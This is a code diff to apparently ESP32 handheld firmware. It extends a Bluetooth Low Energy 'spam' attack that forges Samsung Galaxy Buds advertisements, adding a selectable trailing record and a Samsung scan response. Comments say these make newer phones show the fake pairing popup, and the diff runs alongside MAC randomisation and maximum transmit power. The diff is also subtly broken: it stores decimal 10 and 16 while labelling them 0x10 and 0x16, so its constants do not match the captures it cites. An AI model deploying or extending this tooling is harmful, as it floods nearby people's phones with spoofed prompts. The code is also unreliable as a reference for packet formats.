@@ -630,6 +630,9 @@ struct BleSpamConfig {
     uint32_t gap_ms = 5;
     BleSpamTxPower tx_power = BLE_SPAM_TX_MAX;
     BleSpamMacRandMode mac_rand_mode = BLE_SPAM_MAC_EVERY_PACKET;
+    // Trailing record inside the Galaxy Buds EasySetup packet. Real captures
+    // show 0x16 FF 75; Flipper originally guessed 0x10 FF 75. 0 = omit it.
+    uint8_t buds_stub = 10;
 };
 
 struct BleSpamSelection {
@@ -668,6 +671,7 @@ struct BleSpamEditState {
     uint32_t gap_backup = 0;
     BleSpamTxPower tx_backup = BLE_SPAM_TX_MAX;
     BleSpamMacRandMode mac_backup = BLE_SPAM_MAC_EVERY_PACKET;
+    uint8_t buds_stub_backup = 10;
 };
 
 struct BleSpamListMetrics {
@@ -832,6 +836,23 @@ static BleSpamTxPower bleSpamClampTxPower(uint8_t value) {
     return static_cast<BleSpamTxPower>(value);
 }
 
+static uint8_t bleSpamClampBudsStub(uint8_t value) {
+    if (value == 0 || value == 16) return value;
+    return 10;
+}
+
+static const char *bleSpamBudsStubLabel(uint8_t stub) {
+    switch (stub) {
+        case 0: return "None";
+        case 16: return "0x16";
+        default: return "0x10";
+    }
+}
+
+// Kept in sync with config.buds_stub so the packet builder can read it
+// without threading the config through every build call.
+static uint8_t g_samsungBudsStub = 10;
+
 static BleSpamMacRandMode bleSpamClampMacMode(uint8_t value) {
     if (value > BLE_SPAM_MAC_EVERY_50) return BLE_SPAM_MAC_EVERY_PACKET;
     return static_cast<BleSpamMacRandMode>(value);
@@ -858,10 +879,12 @@ static BleSpamConfig bleSpamLoadConfig() {
             config.gap_ms = bleSpamClampMs(prefs.getUInt("gap_ms", config.gap_ms));
             config.mac_rand_mode = bleSpamClampMacMode(prefs.getUChar("mac_rand", config.mac_rand_mode));
             config.tx_power = bleSpamClampTxPower(prefs.getUChar("tx_power", config.tx_power));
+            config.buds_stub = bleSpamClampBudsStub(prefs.getUChar("buds_stub", config.buds_stub));
         }
         prefs.end();
     }
 #endif
+    g_samsungBudsStub = config.buds_stub;
     return config;
 }
 
@@ -873,6 +896,7 @@ static void bleSpamSaveConfig(const BleSpamConfig &config) {
         prefs.putUInt("gap_ms", bleSpamClampMs(config.gap_ms));
         prefs.putUChar("tx_power", static_cast<uint8_t>(config.tx_power));
         prefs.putUChar("mac_rand", static_cast<uint8_t>(config.mac_rand_mode));
+        prefs.putUChar("buds_stub", bleSpamClampBudsStub(config.buds_stub));
         prefs.putUChar("tx_init", 1);
         prefs.end();
     }
@@ -1362,8 +1386,9 @@ static bool bleSpamBuildAppleContinuityAdvertisement(BLEAdvertisementData &adver
 }
 
 static bool bleSpamBuildAdvertisementData(
-    BleSpamAttackType attackType, int deviceIndex, BLEAdvertisementData &advertisementData
+    BleSpamAttackType attackType, int deviceIndex, BLEAdvertisementData &advertisementData, bool *outBuds = nullptr
 ) {
+    if (outBuds) *outBuds = false;
     switch (attackType) {
 #if !defined(LITE_VERSION)
         case BLE_SPAM_ATTACK_APPLE_PAIRING: {
@@ -1457,6 +1482,7 @@ static bool bleSpamBuildAdvertisementData(
             } else {
                 sendBuds = false; // Galaxy Watch
             }
+            if (outBuds) *outBuds = sendBuds;
 
             if (sendBuds) {
                 uint32_t model = samsung_buds_models[random(samsung_buds_count)];
@@ -1490,13 +1516,15 @@ static bool bleSpamBuildAdvertisementData(
                 Buds_Data[bi++] = 0x00;
                 Buds_Data[bi++] = 0xC7;
                 Buds_Data[bi++] = 0x00;
-                // Trailing truncated record (length=0x10 claimed, only 2 data
-                // bytes present) — ported from the Flipper Zero ble_spam app.
-                // Real Galaxy Buds advertise this stub second record; without
-                // it Samsung's scanner doesn't recognize the packet.
-                Buds_Data[bi++] = 0x10;
-                Buds_Data[bi++] = 0xFF;
-                Buds_Data[bi++] = 0x75;
+                // Trailing truncated record — Samsung's scanner expects a second
+                // manufacturer record after the main packet. Real captures show
+                // 0x16 FF 75; Flipper originally used 0x10 FF 75. Selectable via
+                // config (Buds Stub) since newer One UI builds differ.
+                if (g_samsungBudsStub != 0) {
+                    Buds_Data[bi++] = g_samsungBudsStub;
+                    Buds_Data[bi++] = 0xFF;
+                    Buds_Data[bi++] = 0x75;
+                }
                 AdvData.addData(Buds_Data, bi);
                 // Buds_Data already fills the full 31-byte legacy adv payload;
                 // there's no room left for a Flags AD element, so don't add one
@@ -1579,7 +1607,9 @@ static bool bleSpamIsCacheable(BleSpamAttackType attackType) {
 }
 
 static const BLEAdvertisementData *
-bleSpamSelectAdvertisement(BleSpamRunState &state, BleSpamAttackType attackType, int deviceIndex) {
+bleSpamSelectAdvertisement(BleSpamRunState &state, BleSpamAttackType attackType, int deviceIndex,
+                           bool *outBuds = nullptr) {
+    if (outBuds) *outBuds = false;
     if (bleSpamIsCacheable(attackType)) {
         if (!state.cached_valid || state.cached_type != attackType ||
             state.cached_device_index != deviceIndex) {
@@ -1592,7 +1622,8 @@ bleSpamSelectAdvertisement(BleSpamRunState &state, BleSpamAttackType attackType,
         return &state.cached_advertisement;
     }
 
-    if (!bleSpamBuildAdvertisementData(attackType, deviceIndex, state.working_advertisement)) return nullptr;
+    if (!bleSpamBuildAdvertisementData(attackType, deviceIndex, state.working_advertisement, outBuds))
+        return nullptr;
     return &state.working_advertisement;
 }
 
@@ -1700,6 +1731,7 @@ static void
 bleSpamSendTick(BleSpamRunState &state, const BleSpamConfig &config, const BleSpamSelection &selection) {
     uint32_t now = millis();
     static BLEAdvertisementData emptyScanResponse = BLEAdvertisementData();
+    static BLEAdvertisementData samsungScanResponse = BLEAdvertisementData();
 
     if (state.adv_active && now >= state.adv_stop_ms) {
         if (pAdvertising) pAdvertising->stop();
@@ -1721,6 +1753,8 @@ bleSpamSendTick(BleSpamRunState &state, const BleSpamConfig &config, const BleSp
 
         if (!pAdvertising) return;
 
+        bool sendBudsScanResponse = false;
+
         // For beacon random spam, force a stop before setting new data so NimBLE
         // flushes the payload and picks up the new name every packet
         if (attackType == BLE_SPAM_ATTACK_BLE_BEACON && bleSpamBeaconName.length() == 0) {
@@ -1728,11 +1762,22 @@ bleSpamSendTick(BleSpamRunState &state, const BleSpamConfig &config, const BleSp
         }
 
         const BLEAdvertisementData *advertisementData =
-            bleSpamSelectAdvertisement(state, attackType, deviceIndex);
+            bleSpamSelectAdvertisement(state, attackType, deviceIndex, &sendBudsScanResponse);
         if (!advertisementData) return;
 
+        // Real Galaxy Buds answer scan requests with Samsung manufacturer data
+        // (13 zero bytes). The working reference app sends this for Buds; newer
+        // One UI builds expect it before showing the pairing popup, older ones
+        // tolerate its absence. Our advertising is ADV_SCAN_IND (scannable), so
+        // these bytes are transmitted when a phone sends a scan request.
+        if (sendBudsScanResponse && samsungScanResponse.getPayload().size() == 0) {
+            const uint8_t sr[17] = {0x10, 0xFF, 0x75, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+            samsungScanResponse.addData(sr, sizeof(sr));
+        }
+
         pAdvertising->setAdvertisementData(*advertisementData);
-        pAdvertising->setScanResponseData(emptyScanResponse);
+        pAdvertising->setScanResponseData(sendBudsScanResponse ? samsungScanResponse : emptyScanResponse);
         pAdvertising->start();
 
         state.adv_active = true;
@@ -1756,21 +1801,25 @@ static void bleSpamUpdateStats(BleSpamRunState &state) {
 static String bleSpamFormatMs(uint32_t ms) { return String(ms) + " ms"; }
 
 static void bleSpamRenderConfigRows(
-    const BleSpamConfig &config, int cursor, const BleSpamEditState &editState, int startY, int rowH
+    const BleSpamConfig &config, int cursor, const BleSpamEditState &editState, int startY, int rowH,
+    bool showBudsStub
 ) {
     tft.setTextSize(FP);
 
     struct RowInfo {
         const char *label;
         String value;
-    } rows[] = {
-        {"Adv ms",   bleSpamFormatMs(config.adv_ms)           },
-        {"Gap ms",   bleSpamFormatMs(config.gap_ms)           },
-        {"TX Power", bleSpamTxPowerLabel(config.tx_power)     },
-        {"MAC Rand", bleSpamMacRandLabel(config.mac_rand_mode)}
-    };
+    } rows[5];
+    int rowCount = 0;
+    rows[rowCount++] = {"Adv ms",   bleSpamFormatMs(config.adv_ms)      };
+    rows[rowCount++] = {"Gap ms",   bleSpamFormatMs(config.gap_ms)      };
+    rows[rowCount++] = {"TX Power", bleSpamTxPowerLabel(config.tx_power)};
+    rows[rowCount++] = {"MAC Rand", bleSpamMacRandLabel(config.mac_rand_mode)};
+    if (showBudsStub) {
+        rows[rowCount++] = {"Buds Stub", bleSpamBudsStubLabel(config.buds_stub)};
+    }
 
-    for (int i = 0; i < 4; i++) {
+    for (int i = 0; i < rowCount; i++) {
         int rowY = startY + i * rowH;
         bool selected = (cursor == i);
         bool editing = (editState.editing && editState.edit_row == i);
@@ -1792,6 +1841,9 @@ bleSpamConfigScreen(const BleSpamSelection &selection, BleSpamConfig &config, bo
     int cursor = 0;
     bool layoutDrawn = false;
     bool redrawRows = true;
+    bool showBudsStub = (selection.attack_type == BLE_SPAM_ATTACK_SAMSUNG);
+    int rowCount = showBudsStub ? 5 : 4;
+    int totalRows = rowCount + 1; // data rows + [Start]
 
     while (true) {
         if (!layoutDrawn) {
@@ -1807,13 +1859,13 @@ bleSpamConfigScreen(const BleSpamSelection &selection, BleSpamConfig &config, bo
             int footerH = FP * LH + 4;
             int footerY = tftHeight - footerH - 8;
             int available = footerY - rowStart - 4;
-            int rowH = max(1, min(FP * LH + 4, available / 5));
-            int startRowY = rowStart + rowH * 4;
+            int rowH = max(1, min(FP * LH + 4, available / totalRows));
+            int startRowY = rowStart + rowH * rowCount;
 
-            bleSpamRenderConfigRows(config, cursor, editState, rowStart, rowH);
+            bleSpamRenderConfigRows(config, cursor, editState, rowStart, rowH, showBudsStub);
 
             tft.fillRect(10, startRowY, tftWidth - 20, rowH, bruceConfig.bgColor);
-            uint16_t startColor = (cursor == 4) ? TFT_YELLOW : bruceConfig.priColor;
+            uint16_t startColor = (cursor == rowCount) ? TFT_YELLOW : bruceConfig.priColor;
             tft.setTextColor(startColor, bruceConfig.bgColor);
             tft.drawCentreString("[ Start ]", tftWidth / 2, startRowY + 2, 1);
 
@@ -1832,6 +1884,7 @@ bleSpamConfigScreen(const BleSpamSelection &selection, BleSpamConfig &config, bo
                     case 1: config.gap_ms = editState.gap_backup; break;
                     case 2: config.tx_power = editState.tx_backup; break;
                     case 3: config.mac_rand_mode = editState.mac_backup; break;
+                    case 4: config.buds_stub = editState.buds_stub_backup; break;
                 }
                 editState.editing = false;
                 redrawRows = true;
@@ -1845,13 +1898,14 @@ bleSpamConfigScreen(const BleSpamSelection &selection, BleSpamConfig &config, bo
                 editState.editing = false;
                 redrawRows = true;
             } else {
-                if (cursor == 4) return true;
+                if (cursor == rowCount) return true;
                 editState.editing = true;
                 editState.edit_row = cursor;
                 editState.adv_backup = config.adv_ms;
                 editState.gap_backup = config.gap_ms;
                 editState.tx_backup = config.tx_power;
                 editState.mac_backup = config.mac_rand_mode;
+                editState.buds_stub_backup = config.buds_stub;
                 redrawRows = true;
             }
         }
@@ -1870,6 +1924,10 @@ bleSpamConfigScreen(const BleSpamSelection &selection, BleSpamConfig &config, bo
                 } else if (editState.edit_row == 3) {
                     config.mac_rand_mode = static_cast<BleSpamMacRandMode>((config.mac_rand_mode + 1) % 8);
                     configChanged = true;
+                } else if (editState.edit_row == 4) {
+                    config.buds_stub = (config.buds_stub == 0) ? 10 : (config.buds_stub == 10) ? 16 : 0;
+                    g_samsungBudsStub = config.buds_stub;
+                    configChanged = true;
                 }
                 redrawRows = true;
             } else if (check(PrevPress)) {
@@ -1885,15 +1943,19 @@ bleSpamConfigScreen(const BleSpamSelection &selection, BleSpamConfig &config, bo
                 } else if (editState.edit_row == 3) {
                     config.mac_rand_mode = static_cast<BleSpamMacRandMode>((config.mac_rand_mode + 7) % 8);
                     configChanged = true;
+                } else if (editState.edit_row == 4) {
+                    config.buds_stub = (config.buds_stub == 0) ? 16 : (config.buds_stub == 10) ? 0 : 10;
+                    g_samsungBudsStub = config.buds_stub;
+                    configChanged = true;
                 }
                 redrawRows = true;
             }
         } else {
             if (check(NextPress)) {
-                cursor = (cursor + 1) % 5;
+                cursor = (cursor + 1) % totalRows;
                 redrawRows = true;
             } else if (check(PrevPress)) {
-                cursor = (cursor + 4) % 5;
+                cursor = (cursor + totalRows - 1) % totalRows;
                 redrawRows = true;
             }
         }
@@ -1911,6 +1973,8 @@ static void bleSpamRenderRunningScreen(
     static int rowH = 0;
 
     if (fullRedraw) {
+        bool showBudsStub = (selection.attack_type == BLE_SPAM_ATTACK_SAMSUNG);
+        int configRows = showBudsStub ? 5 : 4;
         String title = bleSpamGetDeviceName(selection.attack_type, selection.device_index);
         drawMainBorderWithTitle(bleSpamMakeTitle(title));
 
@@ -1918,12 +1982,13 @@ static void bleSpamRenderRunningScreen(
         int footerH = FP * LH + 4;
         int footerY = tftHeight - footerH - 8;
         int sepGap = 4;
+        int divider = configRows + 2; // 2 stats rows + config rows
         int available = footerY - statsY - sepGap - 2;
-        rowH = max(1, min(FP * LH + 4, available / 6));
+        rowH = max(1, min(FP * LH + 4, available / divider));
         configStartY = statsY + rowH * 2 + sepGap;
 
         tft.drawFastHLine(8, statsY + rowH * 2 - 2, tftWidth - 16, bruceConfig.priColor);
-        tft.drawFastHLine(8, configStartY + rowH * 4 - 2, tftWidth - 16, bruceConfig.priColor);
+        tft.drawFastHLine(8, configStartY + rowH * configRows - 2, tftWidth - 16, bruceConfig.priColor);
 
         tft.setTextColor(TFT_DARKGREY, bruceConfig.bgColor);
         tft.fillRect(8, footerY, tftWidth - 16, footerH, bruceConfig.bgColor);
@@ -1955,7 +2020,8 @@ static void bleSpamRenderRunningScreen(
     if (configDirty) {
         BleSpamEditState viewEdit = editState;
         int drawCursor = cursor;
-        bleSpamRenderConfigRows(config, drawCursor, viewEdit, configStartY, rowH);
+        bool showBudsStub = (selection.attack_type == BLE_SPAM_ATTACK_SAMSUNG);
+        bleSpamRenderConfigRows(config, drawCursor, viewEdit, configStartY, rowH, showBudsStub);
     }
 }
 
@@ -2024,9 +2090,11 @@ static void bleSpamRunScreen(const BleSpamSelection &selection, BleSpamConfig &c
         // Set Samsung device index for OUI MAC generation
         if (selection.attack_type == BLE_SPAM_ATTACK_SAMSUNG) {
             currentSamsungDeviceIndex = selection.device_index;
+            g_samsungBudsStub = config.buds_stub;
         } else {
             currentSamsungDeviceIndex = -1;
         }
+        int runRowCount = (selection.attack_type == BLE_SPAM_ATTACK_SAMSUNG) ? 5 : 4;
 
         BleSpamRunState runState;
         uint8_t initialMac[6];
@@ -2074,6 +2142,7 @@ static void bleSpamRunScreen(const BleSpamSelection &selection, BleSpamConfig &c
                         case 1: config.gap_ms = editState.gap_backup; break;
                         case 2: config.tx_power = editState.tx_backup; break;
                         case 3: config.mac_rand_mode = editState.mac_backup; break;
+                        case 4: config.buds_stub = editState.buds_stub_backup; break;
                     }
                     editState.editing = false;
                     configDirty = true;
@@ -2100,6 +2169,7 @@ static void bleSpamRunScreen(const BleSpamSelection &selection, BleSpamConfig &c
                     editState.gap_backup = config.gap_ms;
                     editState.tx_backup = config.tx_power;
                     editState.mac_backup = config.mac_rand_mode;
+                    editState.buds_stub_backup = config.buds_stub;
                     configDirty = true;
                 }
             }
@@ -2116,6 +2186,9 @@ static void bleSpamRunScreen(const BleSpamSelection &selection, BleSpamConfig &c
                         config.mac_rand_mode =
                             static_cast<BleSpamMacRandMode>((config.mac_rand_mode + 1) % 8);
                         runState.mac_initialized = false;
+                    } else if (editState.edit_row == 4) {
+                        config.buds_stub = (config.buds_stub == 0) ? 10 : (config.buds_stub == 10) ? 16 : 0;
+                        g_samsungBudsStub = config.buds_stub;
                     }
                     configDirty = true;
                 } else if (check(PrevPress)) {
@@ -2129,15 +2202,18 @@ static void bleSpamRunScreen(const BleSpamSelection &selection, BleSpamConfig &c
                         config.mac_rand_mode =
                             static_cast<BleSpamMacRandMode>((config.mac_rand_mode + 7) % 8);
                         runState.mac_initialized = false;
+                    } else if (editState.edit_row == 4) {
+                        config.buds_stub = (config.buds_stub == 0) ? 16 : (config.buds_stub == 10) ? 0 : 10;
+                        g_samsungBudsStub = config.buds_stub;
                     }
                     configDirty = true;
                 }
             } else {
                 if (check(NextPress)) {
-                    cursor = (cursor + 1) % 4;
+                    cursor = (cursor + 1) % runRowCount;
                     configDirty = true;
                 } else if (check(PrevPress)) {
-                    cursor = (cursor + 3) % 4;
+                    cursor = (cursor + runRowCount - 1) % runRowCount;
                     configDirty = true;
                 }
             }
